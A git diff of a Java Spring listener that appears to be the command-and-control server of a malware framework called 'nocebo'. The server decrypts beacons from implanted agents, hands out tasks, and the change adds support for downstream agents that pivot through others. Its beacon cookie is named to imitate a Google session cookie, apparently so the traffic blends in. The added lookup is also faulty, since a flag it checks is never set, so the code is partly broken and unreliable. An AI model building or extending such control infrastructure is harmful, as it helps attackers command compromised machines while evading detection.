@@ -39,6 +39,7 @@ import java.util.Hashtable;
 import java.util.Base64;
 import java.util.Random;
 import java.util.Enumeration;
+import java.util.Set;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -80,15 +81,10 @@ public class ListenerApplication {
 			static Hashtable<String,session> sessionTable = new Hashtable();
 		}
 
-		
-
 		@PostMapping("/60000")
 		String auth(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			session sessionData;
-			System.out.println(requestData);
-
-
 			String currentKey;
 			//validate auth first
 
@@ -106,8 +102,6 @@ public class ListenerApplication {
 				currentKey = sessionData.encKey;
 			}
 
-			System.out.println(currentKey);
-			System.out.println(sessionData.nonce);
 			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
 			byte[] decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);
 
@@ -140,7 +134,6 @@ public class ListenerApplication {
 			sessionData.nonce = newNonce;
 			sessionData.tasks = new ArrayList();
 			epc.sessionTable.put(idCookie,sessionData);
-
 
 			return retrData;
 		}
@@ -176,7 +169,10 @@ public class ListenerApplication {
 				)
 			);
 			
-			System.out.println(xmlParsed.toString());
+			if (!xmlParsed.get("uuid").equals(idCookie))
+			{
+				sessionData.downstream.add(xmlParsed.get("uuid"));
+			}
 
 			sessionData.data.add(xmlParsed);
 
@@ -186,13 +182,32 @@ public class ListenerApplication {
 		@PostMapping("/tasking")
 		String ctrl(@RequestBody noceboApiCommand requestData, @CookieValue("nocebo.auth") String authCookie) throws IOException
 		{
+			session sessionData = null;
+			boolean foundDownstream = false;
 			//put authenticator in front
 			if (!epc.sessionTable.keySet().contains(requestData.uuid))
 			{
-				return "Fatal Error: Invalid session uuid. Agent associated with session ID is most likely dead.";
+				Enumeration<String> k = epc.sessionTable.keys();
+				while (k.hasMoreElements())
+				{
+					String sessionKey = k.nextElement();
+					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
+					if (tempSessionData.downstream.contains(requestData.uuid))
+					{
+						sessionData = tempSessionData;
+					}
+				}
+				
+				if (!foundDownstream)
+				{
+					return "Fatal Error: Specified agent session UUID not found in upstream or downstream session objects. Agent associated with session ID is most likely dead.";
+				}
 			}
-
-			session sessionData = (session) epc.sessionTable.get(requestData.uuid);
+			else
+			{
+				sessionData = (session) epc.sessionTable.get(requestData.uuid);
+			}
+			
 
 			Hashtable newTask = napi.mkTask(
 				requestData.className,
@@ -243,6 +258,7 @@ public class ListenerApplication {
 			static ArrayList data = new ArrayList();
 			static String encKey = new String();
 			static String nonce = new String();
+			static ArrayList downstream = new ArrayList();
 		}
 	
 	
